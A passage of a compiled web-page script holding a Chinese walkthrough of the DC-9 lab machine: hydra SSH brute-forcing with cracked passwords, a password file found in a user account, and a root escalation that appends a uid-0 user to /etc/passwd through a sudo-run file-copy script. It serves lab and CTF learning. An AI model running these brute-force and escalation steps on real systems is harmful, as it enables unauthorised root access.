punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v(" up"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" scanned "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.21")]),s._v(" seconds\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[s._v("用什么来连呢，还记得前面泄露的那张表吗")]),s._v(" "),a("p",[s._v("我们可以用hydra跑一跑")]),s._v(" "),a("p",[s._v("将用户名和密码分别放在users.txt和passwd.txt里")]),s._v(" "),a("p",[s._v("跑出来")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("ssh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" host: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".31.222   login: chandlerb   password: UrAG0D"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("                           \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("ssh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" host: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".31.222   login: joeyt   password: Passw0rd                               \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("ssh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" host: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".31.222   login: janitor   password: Ilovepeepee\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("然后就能连上ssh")]),s._v(" "),a("p",[s._v("joeyt和chandlerb的账号上都没有找到有意思的东西")]),s._v(" "),a("p",[s._v("在janitor的账户上找到了更多的密码")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt \nBamBam01\nPassw0rd\nsmellycats\nP0Lic#10-4\nB4-Tru3-001\n4uGU5T-NiGHts\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("接着放进hydra里跑一跑")]),s._v(" "),a("p",[s._v("多了一条")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("ssh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" host: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".31.222   login: fredf   password: B4-Tru3-001\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("常规sudo -l一下发现fredf可以执行一个程序")]),s._v(" "),a("p",[s._v("试一下执行")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("fredf@dc-9:~$ /opt/devstuff/dist/test/test\nUsage: python test.py read append\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("还是先看一下源码吧")]),s._v(" "),a("p",[s._v("根据经验，源码应该放在/dist的父目录里")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[s._v("fredf@dc"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("9")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("opt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("devstuff$ cat test"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("py\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#!/usr/bin/python")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" sys\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("len")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Usage: python test.py read append"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    sys"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("exit "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    f "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("open")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"r"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    output "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("f"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("read"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    f "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("open")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"a"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    f"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("write"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("output"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    f"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("close"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("p",[s._v("怎么利用这个脚本完成最后一步的提权呢？")]),s._v(" "),a("p",[s._v("注意到test执行的时候是有root权限的，")]),s._v(" "),a("p",[s._v("而这个程序又刚好可以让我们任意写")]),s._v(" "),a("p",[s._v("所有我们可以利用这个脚本往/etc/passwd里写一个管理员用户即可")]),s._v(" "),a("p",[s._v("先说说shadow文件中第二列的格式，它是加密后的密码，它有些玄机，不同的特殊字符表示特殊的意义：")]),s._v(" "),a("blockquote",[a("ol",[a("li",[s._v('该列留空，即"::"，表示该用户没有密码。')]),s._v(" "),a("li",[s._v('该列为"!"，即":!:"，表示该用户被锁，被锁将无法登陆，但是可能其他的登录方式是不受限制的，如ssh公钥认证的方式，su的方式。')]),s._v(" "),a("li",[s._v('该列为""，即"::"，也表示该用户被锁，和"!“效果是一样的。')]),s._v(" "),a("li",[s._v("该列以”!“或”!!“开头，则也表示该用户被锁。")]),s._v(" "),a("li",[s._v('该列为”!!"，即":!!:"，表示该用户从来没设置过密码。')]),s._v(" "),a("li",[s._v('如果格式为"$id$salt$hashed"，则表示该用户密码正常。其中​$id$的id表示密码的加密算法，$1$表示使用MD5算法，$2a$表示使用Blowfish算法，"$2y$“是另一算法长度的Blowfish,”$5$“表示SHA-256算法，而”$6$"表示SHA-512算法，\n目前基本上都使用sha-512算法的，但无论是md5还是sha-256都仍然支持。$salt$是加密时使用的salt，hashed才是真正的密码部分。')])])]),s._v(" "),a("p",[s._v("如下构造用户密码段")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("fredf@dc-9:/opt/devstuff/dist/test$ openssl "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("passwd")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-1")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-salt")]),s._v(" eki "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123456")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$1")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$eki")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$6AfXWsJC4WDuk9MwHsLDY")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("eki:"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$1")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$eki")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$6AfXWsJC4WDuk9MwHsLDY")]),s._v(".:0:0::/root:/bin/bash\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("/tmp目录可写 我们就写到tmp里好了")]),s._v(" "),a("p",[s._v("Exp：")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'eki:$1$eki$6AfXWsJC4WDuk9MwHsLDY.:0:0::/root:/bin/bash'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /tmp/eki\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("test")]),s._v(" /tmp/eki /etc/passwd\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v(" eki\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123456")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("然后就拿到theflag.txt啦！")]),s._v(" "),a("h3",{attrs:{id:"参考资料"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#参考资料"}},[s._v("#")]),s._v(" 参考资料")]),s._v(" "),a("p",[s._v("LFI fuzz：https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/lfi")]),s._v(" "),a("p",[s._v("/etc/passwd的结构：https://blog.csdn.net/dearsq/article/details/52586320")]),s._v(" "),a("p",[s._v("/etc/passwd 密码段的生成方式：https://blog.csdn.net/jiajiren11/article/details/80376371")])])}),[],!1,null,null,null);a.default=n.exports}}]);